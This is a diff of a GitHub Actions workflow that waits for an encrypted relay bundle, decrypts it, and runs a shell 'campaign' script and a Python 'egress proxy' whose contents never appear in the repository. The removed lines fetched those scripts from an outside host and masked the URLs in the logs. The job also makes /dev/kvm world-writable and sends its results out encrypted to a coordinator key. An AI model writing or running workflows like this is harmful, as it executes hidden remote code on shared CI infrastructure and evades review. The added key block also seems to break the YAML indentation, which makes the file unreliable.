@@ -1,4 +1,3 @@
-# candidate-dbus-system-user-diagnostic-20261031
 name: trackb-encrypted-rootfs-diagnostic
 on:
   push:
@@ -9,7 +8,7 @@ permissions:
 jobs:
   rootfs-diagnostic:
     runs-on: ubuntu-latest
-    timeout-minutes: 20
+    timeout-minutes: 25
     steps:
       - name: Generate one-time runner key
         shell: bash
@@ -27,7 +26,7 @@ jobs:
           name: trackb-rootfs-runner-key-${{ github.run_id }}
           path: ${{ runner.temp }}/so-trackb-rootfs/key-out/
           retention-days: 1
-      - name: Run encrypted exact-script rootfs diagnostic
+      - name: Run encrypted exact-candidate rootfs diagnostic
         shell: bash
         run: |
           set -Eeuo pipefail; umask 077
@@ -39,6 +38,7 @@ jobs:
             sleep 5
           done
           [[ "$found" == 1 ]] || { echo RELAY_WAIT_TIMEOUT; exit 70; }
+          echo RELAY_RECEIVED
           base64 -d "$ROOT/in/relay.tar.gz.enc.b64" > "$ROOT/in/relay.tar.gz.enc"
           base64 -d "$ROOT/in/relay.pass.enc.b64" > "$ROOT/in/relay.pass.enc"
           openssl pkeyutl -decrypt -inkey "$ROOT/runner-private.pem" -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -in "$ROOT/in/relay.pass.enc" -out "$ROOT/in/relay.pass"
@@ -46,15 +46,13 @@ jobs:
           tar -xzf "$ROOT/in/relay.tar.gz" -C "$ROOT/in"
           . "$ROOT/in/relay.env"
           [[ "$PROOF_HEAD" =~ ^[0-9a-f]{40}$ && "$CAMPAIGN_SHA256" =~ ^[0-9a-f]{64}$ && "$PROXY_SHA256" =~ ^[0-9a-f]{64}$ ]] || exit 71
-          [[ "$CAMPAIGN_URL" == https://mcp.sentinelx.app/files/d/* && "$PROXY_URL" == https://mcp.sentinelx.app/files/d/* ]] || exit 71
-          echo "::add-mask::$PROOF_HEAD"; echo "::add-mask::$CAMPAIGN_URL"; echo "::add-mask::$PROXY_URL"
-          curl -fsS -X POST -L "$CAMPAIGN_URL" -o "$ROOT/work/trackb-firecracker-campaign.sh"
-          curl -fsS -X POST -L "$PROXY_URL" -o "$ROOT/work/trackb-egress-proxy.py"
-          unset CAMPAIGN_URL PROXY_URL
+          cp "$ROOT/in/trackb-firecracker-campaign.sh" "$ROOT/work/trackb-firecracker-campaign.sh"
+          cp "$ROOT/in/trackb-egress-proxy.py" "$ROOT/work/trackb-egress-proxy.py"
           cd "$ROOT/work"
           [[ "$(sha256sum trackb-firecracker-campaign.sh | awk '{print $1}')" == "$CAMPAIGN_SHA256" ]] || exit 72
           [[ "$(sha256sum trackb-egress-proxy.py | awk '{print $1}')" == "$PROXY_SHA256" ]] || exit 73
           chmod 700 trackb-firecracker-campaign.sh trackb-egress-proxy.py
+          echo EXACT_SCRIPTS_VERIFIED
           sudo chmod 666 /dev/kvm; test -r /dev/kvm && test -w /dev/kvm
           RUN_DIR="$ROOT/campaign"
           set +e
@@ -64,24 +62,26 @@ jobs:
           printf 'bootstrapRc=%s\n' "$BOOTSTRAP_RC" > "$ROOT/result/summary.txt"
           [[ ! -f "$RUN_DIR/logs/debootstrap.log" ]] || cp "$RUN_DIR/logs/debootstrap.log" "$ROOT/result/debootstrap-outer.log"
           [[ ! -f "$RUN_DIR/work/rootfs-tree/debootstrap/debootstrap.log" ]] || cp "$RUN_DIR/work/rootfs-tree/debootstrap/debootstrap.log" "$ROOT/result/debootstrap-inner.log"
+          [[ ! -f "$RUN_DIR/artifacts/rootfs.sha256" ]] || cp "$RUN_DIR/artifacts/rootfs.sha256" "$ROOT/result/rootfs.sha256"
           df -h "$RUNNER_TEMP" | tail -1 | awk '{print "diskFree=" $4}' >> "$ROOT/result/summary.txt"
           cat > "$ROOT/coordinator-public.pem" <<'PEM'
-          -----BEGIN PUBLIC KEY-----
-          MIIBojANBgkqhkiG9w0BAQEFAAOCAY8AMIIBigKCAYEAqT7iAY8gbZZgE7pVhMoq
-          Xepdr1fsX5hiaIm8/P9rg1OC9kUz+GPHf3xAzHpdh0+BCJ45l9gxkLR7gotWr4lX
-          FOxbXANDc3KCYrv0Kgv/Gt30RoRtv9n9LpWhqfmwwy0F+NSeZRpZzhHoFpjKJ1r2
-          +v670SH0BjQM98tc2aFzGYc0Fa0BJefXpd8EE38xpcz8ErXp6N/dzaUYXcEllyk5
-          GVwdHp5BIC9uepiI9h3hKiu0vyYJmPtoEbgAXpV3kEgJKFCRqoQxzK9/X5SgPuou
-          JiN1ZSYpbR8R6P7QKHwc/gOYBk0bbjiy+Fckgs5W1qMtggB9qfocBI78aEiUq6Et
-          s7klDppsZiyqOynX66azqUc4kJg91EZar5CvqGXts/dfyw/DD0x2Ul1vpQ97rxzj
-          5+dxS6hCxz/1MHI5eKBQyXyU5hskwZ9RovCW0LsuRPlIf3lmnAF7wGmbxW845ROR
-          N43a66t/Q8JmIC4z0tXHFA2w+5odKp/k9Xx41K4SrsWXAgMBAAE=
-          -----END PUBLIC KEY-----
-          PEM
+-----BEGIN PUBLIC KEY-----
+MIIBojANBgkqhkiG9w0BAQEFAAOCAY8AMIIBigKCAYEA2s+XmeHeVtjxfluErLZW
+hFCawOyReUhn9mdR+Kg7bbn9eTqve6+8zR8Sjcy5DIxAnsc37xBtqJg1e90jWFFJ
+/Ew56xCNAcHr1gtZNdKN2js7+kIeVURteHxYbuGWOjK7qaFUp6BKMpVUDbSfhkhH
+i+giHPu5wtmecSQktw0COq9JCsep//zn1NQW5KW+hCXOzARs9R37RRwrGWdvVGVy
+bJ8VvLRXJfa1jJpJZzldkCJ6hRsrilwV60inJM3puNvyrfG9XHNlhsNN14jxdeqE
+cJ37slmsb38oNUQ/2TKEXN48H87atR9WRl4MJ/ZxqxxLql8mHoKOyIvWpgnvZILA
+WpKmYAgb/fuUYwrg+8jQLbXGF2wIQJP87LaWFHGCuEoivtW1ClfoS5ZDHM/ZCYEw
+3V+kYnmgy+gy0dYfTm3fNbF9bHEctnOjR/ygmh2cdMTThKmgv71Dvz3c6AdHvOeq
+wlzqGh2a8rohMcOqJDR1qcwXiTUoNg8LZRMCUw5nc7HlAgMBAAE=
+-----END PUBLIC KEY-----
+PEM
           tar -czf "$ROOT/result.tar.gz" -C "$ROOT/result" .
           openssl rand -hex 32 > "$ROOT/result.pass"
           openssl enc -aes-256-cbc -pbkdf2 -pass file:"$ROOT/result.pass" -in "$ROOT/result.tar.gz" -out "$ROOT/result.tar.gz.enc"
           openssl pkeyutl -encrypt -pubin -inkey "$ROOT/coordinator-public.pem" -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -in "$ROOT/result.pass" -out "$ROOT/result.pass.enc"
+          echo RESULT_ENCRYPTED
           exit "$BOOTSTRAP_RC"
       - name: Upload encrypted result only
         if: always()
